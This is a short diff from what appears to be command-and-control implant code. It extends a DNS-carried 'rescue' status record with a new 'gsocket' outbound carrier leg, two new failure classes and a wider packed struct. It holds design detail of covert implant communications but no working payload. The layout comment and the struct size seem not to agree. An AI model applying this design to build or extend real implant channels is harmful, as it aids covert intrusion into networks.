@@ -1682,9 +1682,9 @@ _FALLBACK_TRANSPORTS = ("https", "dns", "smb", "quic")
 # resolve there, and `relay.py`'s comment on `_PAYLOAD_FIELDS` records the
 # same constraint from the listener's side. The copy is the price; a test
 # in test_dns_rescue compares the two and fails when they drift.
-_RESCUE_VERSION = 1
+_RESCUE_VERSION = 2
 _RESCUE_MARKER = "r"
-_RESCUE_TRANSPORTS = ("https", "dns", "smb", "quic")
+_RESCUE_TRANSPORTS = ("https", "dns", "smb", "quic", "gsocket")
 # The legs that carry traffic *out*. DNS is not one of them, which is
 # the whole reason the rescue exists -- and the reason receiving over
 # DNS must not be read as "the way out is open again".
@@ -1700,6 +1700,11 @@ _RESCUE_CLASSES = {
     "auth_required": 7,
     "bad_payload": 8,
     "resolve_failed": 9,
+    # The two a leg that needs a helper process has and no socket does:
+    # the carrier binary was not on the host, and the carrier was there
+    # and did not come up.
+    "binary_missing": 10,
+    "carrier_failed": 11,
 }
 _RESCUE_FLAG_PROXY_FOUND = 0x01
 _RESCUE_FLAG_DOT1X_SEEN = 0x02
@@ -1708,7 +1713,12 @@ _RESCUE_FLAG_DNS_ANSWERED = 0x08
 # version + (class, code-as-two-bytes) per transport + flags. Two bytes for
 # the code because 407 -- a proxy demanding authentication -- does not fit
 # in one, and nor does any three-digit status above 255.
-_RESCUE_STRUCT = struct.Struct("!BHBHBHBHBHB")
+#
+# Five transports, 19 bytes. There is no v1 arm here and there should not
+# be: a beacon only ever writes the version it was built with. The
+# server-side copy is the one that still has to read the 16-byte records
+# implants deployed before the carrier leg keep sending.
+_RESCUE_STRUCT = struct.Struct("!BHBHBHBHBHBHB")
 # The key the record travels under; see dns_rescue.WRAPPER_KEY for the
 # arithmetic that chose it over an "action" value.
 _RESCUE_WRAPPER_KEY = "r"
